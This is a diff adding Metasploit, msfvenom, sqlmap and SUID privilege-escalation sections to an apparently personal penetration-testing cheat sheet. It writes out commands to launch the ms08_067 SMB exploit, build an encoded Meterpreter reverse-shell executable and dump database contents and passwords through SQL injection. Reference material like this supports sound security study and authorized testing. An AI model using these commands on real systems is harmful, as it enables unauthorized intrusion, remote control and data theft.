@@ -19,7 +19,11 @@
 * [Scanning](#scanning)
   - [nmap (Network scanner)](#nmap)
 * [Exploitation](#exploitation)
+  - [Metasploit](#metasploit)
+  - [msfvenom (Payload generator)](#msfvenom)
+  - [sqlmap (SQL injection)](#sqlmap)
 * [Privilege Escalation](#privilege-escalation)
+  - [suid](#suid)
 * [Post Exploitation](#post-exploitation)
 
 
@@ -375,12 +379,172 @@ Normal Fast scan :
 sudo nmap -F -sV -O http://target
 ```
 
-
+---
 
 
 # Exploitation
 
+## metasploit
+### msfconsole
+**Metasploit Framework**
+
+Framework to exploit vulnerabilities
+
+**commands** :
+- **search** : to search for a **module**
+- **use** : to **use** a **module**
+- **show options** : to show the **options** of the **module**
+- **set** : to **set** the **options** of the **module**
+- **run** : to **run** the **module**
+
+**examples** :
+
+Search for a module :
+```
+msfconsole
+search type:exploit platform:windows
+```
+
+Use a module :
+```
+use exploit/windows/smb/ms08_067_netapi
+```
+
+Show the options of the module :
+```
+show options
+```
+
+Set the options of the module :
+```
+set RHOSTS
+set RPORT
+set PAYLOAD
+set LHOST
+set LPORT
+```
+
+Run the module :
+```
+run
+```
+
+---
+
+## msfvenom
+**Metasploit Framework**
+
+Framework to create payloads
+
+**options** :
+- **-p** : followed by the **payload** to use (ex: windows/meterpreter/reverse_tcp)
+- **-f** : followed by the **format** of the **payload** (ex: exe)
+- **-o** : followed by the **output** of the **payload** (ex: /path/to/output)
+- **-l** : to **list** the **payloads**
+- **-a** : followed by the **architecture** of the **payload** (ex: x86)
+- **-e** : followed by the **encoder** of the **payload** (ex: x86/shikata_ga_nai)
+- **-i** : followed by the **iterations** of the **encoder** (ex: 5)
+- **-b** : followed by the **bad characters** of the **payload** (ex: "\x00\x0a\x0d")
+
+**examples** :
+
+Create a payload :
+```
+msfvenom -p windows/meterpreter/reverse_tcp -f exe -o /path/to/output
+```
+
+Create a payload with **encoder** :
+```
+msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 5 -o /path/to/output
+```
+
+
+---
+
+## sqlmap
+**SQL Injection**
+
+Can be used to enumerate databases, tables, columns, etc. and to try to login
+
+**options** :
+- **-u** : followed by the **url**
+- **--dbs** : to enumerate **databases**
+- **--tables** : to enumerate **tables**
+- **--columns** : to enumerate **columns**
+- **--dump** : to **dump** the **data**
+- **--users** : to enumerate **users**
+- **--passwords** : to enumerate **passwords**
+- **--current-user** : to enumerate the **current user**
+- **--current-db** : to enumerate the **current database**
+- **--batch** : to **batch** the **output**
+- **--crawl** : to **crawl** the **url**
+
+**examples** :
+
+Enumerate databases :
+```
+sqlmap -u http://target --dbs
+```
+
+Enumerate tables :
+```
+sqlmap -u http://target --tables
+```
+
+Enumerate columns :
+```
+sqlmap -u http://target --columns
+```
+
+Dump data :
+```
+sqlmap -u http://target --dump
+```
+
+Enumerate users :
+```
+sqlmap -u http://target --users
+```
+
+Enumerate passwords :
+```
+sqlmap -u http://target --passwords
+```
+
+Enumerate current user :
+```
+sqlmap -u http://target --current-user
+```
+
+
+---
+
+
+
+
+
+
 # Privilege Escalation
+
+## Linux
+## suid
+**SUID**
+
+**suid** is a permission that allows a user to run a program with the permissions of the file owner.
+
+Website to find **suid** binaries : https://gtfobins.github.io/
+
+**examples** :
+
+Find **suid** binaries :
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Script to find **suid** binaries :
+[**suid3num**](https://github.com/Tekam03/Cheatsheet/tree/main/Executables/suid3num.py)
+
+
 
 # Post-exploitation
 
